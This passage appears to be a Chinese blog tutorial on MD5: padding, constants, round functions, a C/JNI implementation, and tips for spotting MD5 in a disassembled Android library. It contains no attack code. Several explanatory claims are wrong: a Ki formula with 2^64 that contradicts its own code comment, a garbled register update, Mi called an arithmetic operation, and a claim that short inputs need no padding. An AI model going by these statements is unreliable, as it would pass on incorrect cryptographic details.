        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="哈希算法—MD5介绍"><a href="#哈希算法—MD5介绍" class="headerlink" title="哈希算法—MD5介绍"></a>哈希算法—MD5介绍</h1><ul><li>算法的输入：任意长度的明文消息</li><li>算法输出：128比特长，或者说32个十六进制数的消息摘要</li></ul><h2 id="MD5的应用场景"><a href="#MD5的应用场景" class="headerlink" title="MD5的应用场景"></a>MD5的应用场景</h2><p>1、<strong>数据完整性校验</strong>：MD5算法常用于验证数据的完整性。在数据传输过程中，发送方可以计算数据的MD5哈希值将其发送给接收方。接收方收到数据后，再次计算哈希值并与发送方提供的哈希值进行比较。如果两者匹配，则说明数据在传输过程中没有被篡改。</p><p>2、<strong>密码存储</strong>：MD5算法也常用于密码存储。将用户的密码通过MD5哈希后存储到数据库中，即时数据库被泄露，攻击者也无法直接获取用户的明文你密码。然而，由于MD5算法存在已知的安全漏洞（如彩虹表攻击和碰撞攻击），现在已不推荐使用MD5来存储密码。更安全的做法是使用加盐哈希（如bcrypt或Argon2）。</p><h2 id="MD5算法原理"><a href="#MD5算法原理" class="headerlink" title="MD5算法原理"></a>MD5算法原理</h2><p>MD5算法的实现，可以分为以下4个步骤：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406151628716.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406161837412.png" alt="图片"> </p><p>MD5算法的整体流程如上图所示，主要分为4步：处理原文、设置初始值、循环加工、拼接结果。</p><h3 id="（一）处理原文"><a href="#（一）处理原文" class="headerlink" title="（一）处理原文"></a>（一）处理原文</h3><p>处理原文就是一个关键词：<strong>补位</strong>，此处的补位有两个地方需要补。那具体怎么补位呢？</p><p>1、<strong>填充</strong>。如果输入信息的长度(bit)对512求余的结果不等于448，就需要填充使得对512求余的结果等于448。填充的方法是填充一个1和n个0。填充完后，信息的长度就为N*512+448(bit)；</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406161842946.png" alt="图片"> </p><p>到这里，就会有两个问题：</p><ul><li>为什么是对512取余，而且为什么补位要补到对512取余后为448？</li><li>如果原文的长度本来就是对512取余是448呢，是不是就不需要进行填充位的填补了？</li></ul><p>首先我们来解决第2个问题：假设原文长度为len，且mod(len, 512) &#x3D; 448，则需要再补充512位的填充位。假设填充位长度为appendLen，则有伪代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">if(mod(len, 512) &lt; 448) &#123;</span><br><span class="line">  appendLen = 448 - mod(len, 512);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  appendLen = 448 + 512 - mod(len, 512);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至于第1个问题，我们接着往下看：</p><p>2、<strong>补数据长度</strong>：这里需要补64位的原文长度，我们会发现，补充齐64位后，整体的长度就是512的整数倍了。这里就可以回答上面的第一个问题了：<strong>MD5是一种基于block的算法，要求每次处理的block都是512bits</strong>。64位的数据长度，即最长可以是2^64 。那如果原文的长度len &gt; 2^64呢？则取len的低阶64位进行填充。</p><p>此时的数据是16字（32位）的整数倍，用M[0，…，N-1]表示此时的数据，其中N为16的倍数。如下图所示：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406161844198.png" alt="图片"> </p><h3 id="（二）设置初始值"><a href="#（二）设置初始值" class="headerlink" title="（二）设置初始值"></a>（二）设置初始值</h3><p>装入标准幻数（四个整数）。标准的幻数（物理顺序）是（A&#x3D;(01234567)16，B&#x3D;(89ABCDEF)16，C&#x3D;(FEDCBA98)16，D&#x3D;(76543210)16）。</p><p>如果在程序中定义应该是:（<code>A=0X67452301L</code>，<code>B=0XEFCDAB89L</code>，<code>C=0X98BADCFEL</code>，<code>D=0X10325476L</code>）这样表示的原因是因为，数据在内存在为小端存储，举个例子，假设我们有一个16位的整数<code>0x1234</code>（这里<code>0x</code>表示十六进制数），在小端存储的系统中，这个数会被存储为<code>0x34 0x12</code>，其中<code>0x34</code>存储在低地址，<code>0x12</code>存储在高地址。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A=0x01234567</span><br><span class="line">B=0x89ABCDEF</span><br><span class="line">C=0xFEDCBA98</span><br><span class="line">D=0x76543210</span><br></pre></td></tr></table></figure><h3 id="（三）循环加工"><a href="#（三）循环加工" class="headerlink" title="（三）循环加工"></a>（三）循环加工</h3><p>这一步是整个算法最重要的一步。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406161908550.png" alt="图片"> </p><p>图中，ABCD就是哈希值的四个分组，每一次循环都会让旧的ABCD产生新的ABCD。一共进行多少次循环呢？由处理后的原文长度决定。</p><p>假设经过第一步处理原文之后的长度为M，则主循环次数L&#x3D;M÷512，每个主循环中包含512÷32*4&#x3D;64次子循环，分为4组16次。上面这张图表达的是一次子循环的流程。</p><ul><li>主循环次数 &#x3D; M &#x2F; 512</li><li>每个主循环中包含 512 &#x2F; 32 * 4 &#x3D; 64 次 子循环</li></ul><p>其中F是一个非线性函数。MD5用到的非线性函数有下面四种，4组循环中依次使用FGHI。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">F(X，Y，Z) =(X&amp;Y) | ((~X) &amp; Z)</span><br><span class="line">G(X，Y，Z) =(X&amp;Z) | (Y &amp; (~Z))</span><br><span class="line">H(X，Y，Z) =X^Y^Z</span><br><span class="line">I(X，Y，Z)=Y^(X|(~Z))</span><br></pre></td></tr></table></figure><p>其中Mi为原文的一个分组，长度为32bits，每次循环所用到的分组编号不同，会交替使用到M0到M15中的数据。</p><p>而Ki则是一个32bits的常量，具体的计算公式如下：</p><p>Ki&#x3D;floor(2^64*sin(i)) i的范围是1~64，单位是弧度</p><p>而&lt;&lt;&lt;s则代表移位操作，注意：这里的移位是<strong>循环移位</strong>！而移多少位，则如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[7，12，17，22 ]</span><br><span class="line">[5，9，14，20]</span><br><span class="line">[4，11，16，23]</span><br><span class="line">[6，10，15，21]</span><br></pre></td></tr></table></figure><p>第一组16次循环中依次使用【7，12，17，22】，使用4次，以此类推。所以经过一次循环后可以发现(其中&#x3D;左边为新，等号右边全部使用旧的abcd)：</p><ul><li><p>A—&gt;经过运算—&gt;B </p></li><li><p>B—&gt;直接—&gt;C</p></li><li><p>C—&gt;直接—&gt;D </p></li><li><p>D—&gt;直接—&gt;A</p></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=d</span><br><span class="line">b=(F(b，c，d)+Mi+Ki)&lt;&lt;&lt;s+a</span><br><span class="line">c=a</span><br><span class="line">d=c</span><br></pre></td></tr></table></figure><p>而一次主循环的4组16次子循环依次如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 第一轮</span><br><span class="line">a=FF(a,b,c,d,M0,7,0xd76aa478)</span><br><span class="line">b=FF(d,a,b,c,M1,12,0xe8c7b756)</span><br><span class="line">c=FF(c,d,a,b,M2,17,0x242070db)</span><br><span class="line">d=FF(b,c,d,a,M3,22,0xc1bdceee)</span><br><span class="line">a=FF(a,b,c,d,M4,7,0xf57c0faf)</span><br><span class="line">b=FF(d,a,b,c,M5,12,0x4787c62a)</span><br><span class="line">c=FF(c,d,a,b,M6,17,0xa8304613)</span><br><span class="line">d=FF(b,c,d,a,M7,22,0xfd469501)</span><br><span class="line">a=FF(a,b,c,d,M8,7,0x698098d8)</span><br><span class="line">b=FF(d,a,b,c,M9,12,0x8b44f7af)</span><br><span class="line">c=FF(c,d,a,b,M10,17,0xffff5bb1)</span><br><span class="line">d=FF(b,c,d,a,M11,22,0x895cd7be)</span><br><span class="line">a=FF(a,b,c,d,M12,7,0x6b901122)</span><br><span class="line">b=FF(d,a,b,c,M13,12,0xfd987193)</span><br><span class="line">c=FF(c,d,a,b,M14,17,0xa679438e)</span><br><span class="line">d=FF(b,c,d,a,M15,22,0x49b40821)</span><br><span class="line"></span><br><span class="line">第二轮</span><br><span class="line">a=GG(a,b,c,d,M1,5,0xf61e2562)</span><br><span class="line">b=GG(d,a,b,c,M6,9,0xc040b340)</span><br><span class="line">c=GG(c,d,a,b,M11,14,0x265e5a51)</span><br><span class="line">d=GG(b,c,d,a,M0,20,0xe9b6c7aa)</span><br><span class="line">a=GG(a,b,c,d,M5,5,0xd62f105d)</span><br><span class="line">b=GG(d,a,b,c,M10,9,0x02441453)</span><br><span class="line">c=GG(c,d,a,b,M15,14,0xd8a1e681)</span><br><span class="line">d=GG(b,c,d,a,M4,20,0xe7d3fbc8)</span><br><span class="line">a=GG(a,b,c,d,M9,5,0x21e1cde6)</span><br><span class="line">b=GG(d,a,b,c,M14,9,0xc33707d6)</span><br><span class="line">c=GG(c,d,a,b,M3,14,0xf4d50d87)</span><br><span class="line">d=GG(b,c,d,a,M8,20,0x455a14ed)</span><br><span class="line">a=GG(a,b,c,d,M13,5,0xa9e3e905)</span><br><span class="line">b=GG(d,a,b,c,M2,9,0xfcefa3f8)</span><br><span class="line">c=GG(c,d,a,b,M7,14,0x676f02d9)</span><br><span class="line">d=GG(b,c,d,a,M12,20,0x8d2a4c8a)</span><br><span class="line"></span><br><span class="line">第三轮</span><br><span class="line">a=HH(a,b,c,d,M5,4,0xfffa3942)</span><br><span class="line">b=HH(d,a,b,c,M8,11,0x8771f681)</span><br><span class="line">c=HH(c,d,a,b,M11,16,0x6d9d6122)</span><br><span class="line">d=HH(b,c,d,a,M14,23,0xfde5380c)</span><br><span class="line">a=HH(a,b,c,d,M1,4,0xa4beea44)</span><br><span class="line">b=HH(d,a,b,c,M4,11,0x4bdecfa9)</span><br><span class="line">c=HH(c,d,a,b,M7,16,0xf6bb4b60)</span><br><span class="line">d=HH(b,c,d,a,M10,23,0xbebfbc70)</span><br><span class="line">a=HH(a,b,c,d,M13,4,0x289b7ec6)</span><br><span class="line">b=HH(d,a,b,c,M0,11,0xeaa127fa)</span><br><span class="line">c=HH(c,d,a,b,M3,16,0xd4ef3085)</span><br><span class="line">d=HH(b,c,d,a,M6,23,0x04881d05)</span><br><span class="line">a=HH(a,b,c,d,M9,4,0xd9d4d039)</span><br><span class="line">b=HH(d,a,b,c,M12,11,0xe6db99e5)</span><br><span class="line">c=HH(c,d,a,b,M15,16,0x1fa27cf8)</span><br><span class="line">d=HH(b,c,d,a,M2,23,0xc4ac5665)</span><br><span class="line"></span><br><span class="line">第四轮</span><br><span class="line">a=II(a,b,c,d,M0,6,0xf4292244)</span><br><span class="line">b=II(d,a,b,c,M7,10,0x432aff97)</span><br><span class="line">c=II(c,d,a,b,M14,15,0xab9423a7)</span><br><span class="line">d=II(b,c,d,a,M5,21,0xfc93a039)</span><br><span class="line">a=II(a,b,c,d,M12,6,0x655b59c3)</span><br><span class="line">b=II(d,a,b,c,M3,10,0x8f0ccc92)</span><br><span class="line">c=II(c,d,a,b,M10,15,0xffeff47d)</span><br><span class="line">d=II(b,c,d,a,M1,21,0x85845dd1)</span><br><span class="line">a=II(a,b,c,d,M8,6,0x6fa87e4f)</span><br><span class="line">b=II(d,a,b,c,M15,10,0xfe2ce6e0)</span><br><span class="line">c=II(c,d,a,b,M6,15,0xa3014314)</span><br><span class="line">d=II(b,c,d,a,M13,21,0x4e0811a1)</span><br><span class="line">a=II(a,b,c,d,M4,6,0xf7537e82)</span><br><span class="line">b=II(d,a,b,c,M11,10,0xbd3af235)</span><br><span class="line">c=II(c,d,a,b,M2,15,0x2ad7d2bb)</span><br><span class="line">d=II(b,c,d,a,M9,21,0xeb86d391)</span><br></pre></td></tr></table></figure><hr><p>具体的实现和原理这些，都可以参考如下内容：</p><p><a href="https://mp.weixin.qq.com/s/Yem3oWb3sg3kh4j-MjWbcA">https://mp.weixin.qq.com/s/Yem3oWb3sg3kh4j-MjWbcA</a></p><hr><h1 id="实现标准MD5算法"><a href="#实现标准MD5算法" class="headerlink" title="实现标准MD5算法"></a>实现标准MD5算法</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Constants are the integer part of the sines of integers (in radians) * 2^32.</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> k[<span class="number">64</span>] = &#123;</span><br><span class="line">    <span class="number">0xd76aa478</span>, <span class="number">0xe8c7b756</span>, <span class="number">0x242070db</span>, <span class="number">0xc1bdceee</span> ,</span><br><span class="line">    <span class="number">0xf57c0faf</span>, <span class="number">0x4787c62a</span>, <span class="number">0xa8304613</span>, <span class="number">0xfd469501</span> ,</span><br><span class="line">    <span class="number">0x698098d8</span>, <span class="number">0x8b44f7af</span>, <span class="number">0xffff5bb1</span>, <span class="number">0x895cd7be</span> ,</span><br><span class="line">    <span class="number">0x6b901122</span>, <span class="number">0xfd987193</span>, <span class="number">0xa679438e</span>, <span class="number">0x49b40821</span> ,</span><br><span class="line">    <span class="number">0xf61e2562</span>, <span class="number">0xc040b340</span>, <span class="number">0x265e5a51</span>, <span class="number">0xe9b6c7aa</span> ,</span><br><span class="line">    <span class="number">0xd62f105d</span>, <span class="number">0x02441453</span>, <span class="number">0xd8a1e681</span>, <span class="number">0xe7d3fbc8</span> ,</span><br><span class="line">    <span class="number">0x21e1cde6</span>, <span class="number">0xc33707d6</span>, <span class="number">0xf4d50d87</span>, <span class="number">0x455a14ed</span> ,</span><br><span class="line">    <span class="number">0xa9e3e905</span>, <span class="number">0xfcefa3f8</span>, <span class="number">0x676f02d9</span>, <span class="number">0x8d2a4c8a</span> ,</span><br><span class="line">    <span class="number">0xfffa3942</span>, <span class="number">0x8771f681</span>, <span class="number">0x6d9d6122</span>, <span class="number">0xfde5380c</span> ,</span><br><span class="line">    <span class="number">0xa4beea44</span>, <span class="number">0x4bdecfa9</span>, <span class="number">0xf6bb4b60</span>, <span class="number">0xbebfbc70</span> ,</span><br><span class="line">    <span class="number">0x289b7ec6</span>, <span class="number">0xeaa127fa</span>, <span class="number">0xd4ef3085</span>, <span class="number">0x04881d05</span> ,</span><br><span class="line">    <span class="number">0xd9d4d039</span>, <span class="number">0xe6db99e5</span>, <span class="number">0x1fa27cf8</span>, <span class="number">0xc4ac5665</span> ,</span><br><span class="line">    <span class="number">0xf4292244</span>, <span class="number">0x432aff97</span>, <span class="number">0xab9423a7</span>, <span class="number">0xfc93a039</span> ,</span><br><span class="line">    <span class="number">0x655b59c3</span>, <span class="number">0x8f0ccc92</span>, <span class="number">0xffeff47d</span>, <span class="number">0x85845dd1</span> ,</span><br><span class="line">    <span class="number">0x6fa87e4f</span>, <span class="number">0xfe2ce6e0</span>, <span class="number">0xa3014314</span>, <span class="number">0x4e0811a1</span> ,</span><br><span class="line">    <span class="number">0xf7537e82</span>, <span class="number">0xbd3af235</span>, <span class="number">0x2ad7d2bb</span>, <span class="number">0xeb86d391</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// r specifies the per-round shift amounts</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> r[] = &#123;<span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>,</span><br><span class="line">                      <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>,</span><br><span class="line">                      <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>,</span><br><span class="line">                      <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// leftrotate function definition</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LEFTROTATE(x, c) (((x) <span class="string">&lt;&lt; (c)) | ((x) &gt;</span>&gt; (32 - (c))))</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">to_bytes</span><span class="params">(<span class="type">uint32_t</span> val, <span class="type">uint8_t</span> *bytes)</span></span><br><span class="line">&#123;</span><br><span class="line">    bytes[<span class="number">0</span>] = (<span class="type">uint8_t</span>) val;</span><br><span class="line">    bytes[<span class="number">1</span>] = (<span class="type">uint8_t</span>) (val &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    bytes[<span class="number">2</span>] = (<span class="type">uint8_t</span>) (val &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    bytes[<span class="number">3</span>] = (<span class="type">uint8_t</span>) (val &gt;&gt; <span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">to_int32</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *bytes)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint32_t</span>) bytes[<span class="number">0</span>]</span><br><span class="line">        | ((<span class="type">uint32_t</span>) bytes[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>)</span><br><span class="line">        | ((<span class="type">uint32_t</span>) bytes[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>)</span><br><span class="line">        | ((<span class="type">uint32_t</span>) bytes[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">md5</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *initial_msg, <span class="type">size_t</span> initial_len, <span class="type">uint8_t</span> *digest)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// These vars will contain the hash</span></span><br><span class="line">    <span class="type">uint32_t</span> h0, h1, h2, h3;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Message (to prepare)</span></span><br><span class="line">    <span class="type">uint8_t</span> *msg = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> new_len, offset;</span><br><span class="line">    <span class="type">uint32_t</span> w[<span class="number">16</span>];</span><br><span class="line">    <span class="type">uint32_t</span> a, b, c, d, i, f, g, temp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Initialize variables - simple count in nibbles:</span></span><br><span class="line">    h0 = <span class="number">0x67452301</span>;</span><br><span class="line">    h1 = <span class="number">0xefcdab89</span>;</span><br><span class="line">    h2 = <span class="number">0x98badcfe</span>;</span><br><span class="line">    h3 = <span class="number">0x10325476</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Pre-processing:</span></span><br><span class="line">    <span class="comment">//append &quot;1&quot; bit to message</span></span><br><span class="line">    <span class="comment">//append &quot;0&quot; bits until message length in bits ≡ 448 (mod 512)</span></span><br><span class="line">    <span class="comment">//append length mod (2^64) to message</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (new_len = initial_len + <span class="number">1</span>; new_len % (<span class="number">512</span>/<span class="number">8</span>) != <span class="number">448</span>/<span class="number">8</span>; new_len++)</span><br><span class="line">        ;</span><br><span class="line"></span><br><span class="line">    msg = (<span class="type">uint8_t</span>*)<span class="built_in">malloc</span>(new_len + <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(msg, initial_msg, initial_len);</span><br><span class="line">    msg[initial_len] = <span class="number">0x80</span>; <span class="comment">// append the &quot;1&quot; bit; most significant bit is &quot;first&quot;</span></span><br><span class="line">    <span class="keyword">for</span> (offset = initial_len + <span class="number">1</span>; offset &lt; new_len; offset++)</span><br><span class="line">        msg[offset] = <span class="number">0</span>; <span class="comment">// append &quot;0&quot; bits</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// append the len in bits at the end of the buffer.</span></span><br><span class="line">    to_bytes(initial_len*<span class="number">8</span>, msg + new_len);</span><br><span class="line">    <span class="comment">// initial_len&gt;&gt;29 == initial_len*8&gt;&gt;32, but avoids overflow.</span></span><br><span class="line">    to_bytes(initial_len&gt;&gt;<span class="number">29</span>, msg + new_len + <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Process the message in successive 512-bit chunks:</span></span><br><span class="line">    <span class="comment">//for each 512-bit chunk of message:</span></span><br><span class="line">    <span class="keyword">for</span>(offset=<span class="number">0</span>; offset&lt;new_len; offset += (<span class="number">512</span>/<span class="number">8</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// break chunk into sixteen 32-bit words w[j], 0 ≤ j ≤ 15</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">            w[i] = to_int32(msg + offset + i*<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Initialize hash value for this chunk:</span></span><br><span class="line">        a = h0;</span><br><span class="line">        b = h1;</span><br><span class="line">        c = h2;</span><br><span class="line">        d = h3;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Main loop:</span></span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i&lt;<span class="number">64</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i &lt; <span class="number">16</span>) &#123;</span><br><span class="line">                f = (b &amp; c) | ((~b) &amp; d);</span><br><span class="line">                g = i;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i &lt; <span class="number">32</span>) &#123;</span><br><span class="line">                f = (d &amp; b) | ((~d) &amp; c);</span><br><span class="line">                g = (<span class="number">5</span>*i + <span class="number">1</span>) % <span class="number">16</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i &lt; <span class="number">48</span>) &#123;</span><br><span class="line">                f = b ^ c ^ d;</span><br><span class="line">                g = (<span class="number">3</span>*i + <span class="number">5</span>) % <span class="number">16</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                f = c ^ (b | (~d));</span><br><span class="line">                g = (<span class="number">7</span>*i) % <span class="number">16</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            temp = d;</span><br><span class="line">            d = c;</span><br><span class="line">            c = b;</span><br><span class="line">            b = b + LEFTROTATE((a + f + k[i] + w[g]), r[i]);</span><br><span class="line">            a = temp;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Add this chunk&#x27;s hash to result so far:</span></span><br><span class="line">        h0 += a;</span><br><span class="line">        h1 += b;</span><br><span class="line">        h2 += c;</span><br><span class="line">        h3 += d;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// cleanup</span></span><br><span class="line">    <span class="built_in">free</span>(msg);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//var char digest[16] := h0 append h1 append h2 append h3 //(Output is in little-endian)</span></span><br><span class="line">    to_bytes(h0, digest);</span><br><span class="line">    to_bytes(h1, digest + <span class="number">4</span>);</span><br><span class="line">    to_bytes(h2, digest + <span class="number">8</span>);</span><br><span class="line">    to_bytes(h3, digest + <span class="number">12</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">    JNIEXPORT jstring JNICALL</span><br><span class="line"><span class="title function_">Java_com_roysue_md5_MainActivity_md5</span><span class="params">(JNIEnv *env, jobject thiz, jstring message)</span> &#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> implement md5()</span></span><br><span class="line">    <span class="type">char</span> *msg = const_cast&lt;<span class="type">char</span> *&gt;(env-&gt;GetStringUTFChars(message,<span class="number">0</span>));</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(msg);</span><br><span class="line">    <span class="type">uint8_t</span> result[<span class="number">16</span>];</span><br><span class="line">    md5(reinterpret_cast&lt;<span class="type">const</span> <span class="type">uint8_t</span> *&gt;(msg), len, result);</span><br><span class="line">    <span class="type">char</span> res[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">16</span> ;i++)</span><br><span class="line">        <span class="built_in">sprintf</span>(res+i*<span class="number">2</span>,<span class="string">&quot;%2.2x&quot;</span>,result[i]);</span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="MD5函数算法描述"><a href="#MD5函数算法描述" class="headerlink" title="MD5函数算法描述"></a>MD5函数算法描述</h2><p><strong>初始化向量</strong></p><p>首先是初始化链接向量。需要4个初始值，每个长32bit。即8个十六进制数。它是运算的主要部分（这块是小端存储）</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406151912016.png" alt="image.png"> </p><p><strong>消息填充</strong></p><p>附加填充，使得其比特长度除以512余数448。填充方式为：先填充一个1，后面跟上足够多的0，一直到符合要求。</p><p>在上一步新生成的字符串后面加上消息长度。消息长度为8字节&#x3D;64bit</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406151913839.png" alt="image.png"> </p><p>首先将初始长度*8放到填充字符串的后面；如果初始长度超出32位表示范围，就只取它超出的部分。总共是8个字节</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406151913948.png" alt="image.png"> </p><p><strong>运算</strong></p><p>下面是一个循环 “ for(offset&#x3D;0; offset&lt;new_len; offset +&#x3D; (512&#x2F;8)) “ 每64个字节为一组，进行分组处理。</p><p>如果我们本身的字符串长度小于448，那也就是不用填充。</p><p>将64个字节，又分为16个小组（4字节&#x3D;32bit）</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406151914943.png" alt="image.png"> </p><p>下面将4个初始化链接向量进行了处理</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406151914326.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406151914016.png" alt="image.png"> </p><p>可以表示为下面图所示的样子。。。。（具体实现可以网上查一下）</p><p>A—&gt;经过运算—&gt;B </p><p>B—&gt;直接—&gt;C</p><p>C—&gt;直接—&gt;D </p><p>D—&gt;直接—&gt;A</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406151915529.png" alt="image.png"> </p><p>可以看到上图中有F、Mi、Ki等标识。</p><ul><li>F：可以理解为一个函数，下面会细说</li><li>Mi：表示一种运算，简单理解就是+-*&#x2F;</li><li>Ki：是一种参与运算的特定序列，如下所示。一般情况，该序列是固定的，也就是Ki如果没有修改过，是不会变化的。这个也是辨别当前算法是否为md5的一个思路。</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406151915866.png" alt="image.png"> </p><p>其实图中的F确实表示的是函数，但不是一个函数，而是4个函数，接收三个参数</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">F</span>(X,Y,Z) = (X&amp;Y)|((~X)&amp;Z)</span><br><span class="line"><span class="title function_">G</span>(X,Y,Z) = (X&amp;Z)|(Y&amp;(~Z))</span><br><span class="line"><span class="title function_">H</span>(X,Y,Z) = X^Y^Z</span><br><span class="line"><span class="title function_">I</span>(X,Y,Z) = Y^(X|(~Z))</span><br></pre></td></tr></table></figure><h1 id="MD5汇编算法识别"><a href="#MD5汇编算法识别" class="headerlink" title="MD5汇编算法识别"></a>MD5汇编算法识别</h1><p><strong>【小技巧】</strong></p><p>可以借助PEID中的插件【Krypto ANALyzer】实现对so中的加密算法进行简单分析。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406151916512.png" alt="img"> </p><p>IDA加载so文件后，定位到md5函数为止</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406151916536.png" alt="image.png"> </p><p>有几个关键点，可以帮助判断当前算法是否为MD5</p><p>一、4个初始化链接向量</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406151916504.png" alt="image.png"> </p><p>二、两个固定数组（加法常数矩阵+循环左移表）</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406151916094.png" alt="image.png"> </p><p>上面这两个点，可以作为md5算法识别的参考。</p><p>同时，如果对MD5算法魔改，其实也是修改<code>常量ABCD</code> 和 